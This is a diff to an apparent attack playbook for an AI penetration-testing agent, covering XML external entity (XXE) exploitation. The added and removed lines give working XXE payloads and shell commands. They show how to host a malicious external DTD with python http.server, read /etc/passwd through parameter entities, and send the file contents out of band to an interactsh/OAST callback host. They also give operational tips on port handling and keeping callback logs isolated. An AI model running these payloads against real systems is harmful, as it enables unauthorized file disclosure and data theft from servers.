@@ -117,10 +117,32 @@ If the doc parses but no field is reflected, coerce the file contents into a
 PARSE ERROR message. This uses PARAMETER entities (`%name;`), which only work
 inside the DTD. Two variants:
 
-(a) Via an external DTD you host (author `err.dtd` with `fs_write`, then serve it
-with `kali_shell`: `cd /tmp && python3 -m http.server 8000 >/tmp/dtd.log 2>&1 &`;
-find your lab-reachable IP with `ip -o addr` and use it as YOUR-CALLBACK-HOST):
-Client body:
+(a) Via an external DTD the target fetches from YOU. Error-based: the file contents
+come back INSIDE the parse error, so (a) needs no outbound exfil callback - only a host
+the target can reach that RETURNS your DTD body. interactsh only LOGS a hit; it cannot
+serve a DTD, so it does not work for (a).
+  - **Host it yourself** on your ONE target-reachable inbound port. Two different
+    numbers, from the "Pre-Configured Payload Settings" block:
+      * the server LISTENS on your handler port - the pool port, or `4444` when a tunnel
+        is active (its ReverseListenerBindPort). With ngrok these differ: LPORT is the
+        public port, the local bind is 4444.
+      * the TARGET's URL is the block's `LHOST:LPORT` (what ngrok/chisel forwards in).
+    That port is your reverse handler's: run `jobs` / `ss -ltn` first, and while this
+    server runs NO Metasploit handler can bind it, for ANY of your chats - so stop it the
+    instant the DTD has been fetched. Author `err.dtd` with `fs_write` FIRST, then serve a
+    dedicated folder holding ONLY it (never `/tmp`: execute_code leaves scripts with target
+    creds there). Keep python the ONLY backgrounded command (setup joined by `;`, every
+    stream redirected, the log OUTSIDE the served folder): backgrounding an `&&` list holds
+    kali_shell's output pipe open until its 300 s timeout and makes `$!` the subshell, and a
+    log inside the folder is readable by the target:
+    `mkdir -p /tmp/xxe_dtd && mv <path of err.dtd> /tmp/xxe_dtd/; python3 -m http.server <listen_port> --directory /tmp/xxe_dtd >/tmp/xxe_dtd.srv.log 2>&1 </dev/null & echo $!`
+    then confirm the bind with `curl -s http://127.0.0.1:<listen_port>/err.dtd >/dev/null && echo up`
+    (a backgrounded `(... &)` prints "up" even when the bind FAILED), and `kill <that PID>`
+    the moment the target has fetched it.
+  - **No reachable inbound port:** serve the DTD from a webhook.site / RequestBin-style
+    endpoint that returns a body, or skip to the LOCAL-DTD variant (b), which needs no
+    hosting at all.
+Client body (YOUR-CALLBACK-HOST = the block's `LHOST:LPORT`, or your webhook host):
 ```
 <?xml version="1.0"?>
 <!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://YOUR-CALLBACK-HOST/err.dtd"> %ext; ]>
@@ -157,21 +179,36 @@ Local-DTD error-based is the go-to when the target cannot reach your callback.
 When there is no reflection and no useful error, exfiltrate to a listener you
 control. This SENDS TARGET DATA to external infrastructure, so only use it when
 the engagement permits an attacker callback; prefer in-band / error-based first.
-Stand up a listener with `kali_shell`: an external OAST oracle
-(`interactsh-client -server oast.fun -json -v > /tmp/oast.log 2>&1 &`) or, on a
-bridged lab you can reach, a self-hosted sink (`cd /tmp && python3 -m http.server
-8000 >/tmp/oob.log 2>&1 &`). Author the remote `oob.dtd` with `fs_write`, serve
-it from that host, then tail the callback log to read the exfiltrated data:
-Client body:
+OOB needs a callback that CAPTURES the data in the request. Split the two roles:
+  - **Capture oracle - interactsh** (`interactsh-client -server oast.fun -json -v
+    > /tmp/oast-RUN.log 2>&1 &`): its domain goes INSIDE the DTD's exfil entity
+    (`http://OAST/?x=%file;`); it logs the query string with your data. It does NOT serve
+    the DTD. Replace `RUN` with a short random token you pick once for this workflow (for
+    example the output of `openssl rand -hex 4`) and reuse it in every file name: all your
+    chats share your sandbox's `/tmp`, so a fixed name would read another chat's callbacks
+    as this one's.
+  - **The DTD itself** must still be fetched by the target. Either host `oob.dtd` on your
+    ONE reachable port (the server LISTENS on your handler port - the pool port, or `4444`
+    with a tunnel; the TARGET's URL is the block's `LHOST:LPORT`; same handler-port warning
+    and the exact start form of Step 5a: python alone in the background, log outside the
+    served folder, then `curl` and `kill`; dedicated folder, never `/tmp`),
+    OR - with no reachable port - use the LOCAL-DTD variant (b) above with its exfil entity
+    pointing at `http://OAST/?x=%file;`. The local-DTD route needs no hosting and interactsh
+    still captures the data. A webhook.site-style endpoint that returns a body is a third
+    host for the DTD when you have no reachable port.
+Author the remote `oob.dtd` with `fs_write`, then tail the interactsh / callback log to
+read the exfiltrated data:
+Client body (DTD-HOST = where you serve oob.dtd: your `LHOST:LPORT`, a webhook host, or
+drop it for the local-DTD route):
 ```
 <?xml version="1.0"?>
-<!DOCTYPE r SYSTEM "http://YOUR-CALLBACK-HOST/oob.dtd">
+<!DOCTYPE r SYSTEM "http://DTD-HOST/oob.dtd">
 <r>&send;</r>
 ```
-Remote `oob.dtd`:
+Remote `oob.dtd` (the exfil entity points at the OAST capture host, not the DTD host):
 ```
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR-CALLBACK-HOST/?x=%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://OAST/?x=%file;'>">
 %all;
 ```
 Read the exfiltrated data from your listener log. For multi-line or binary files
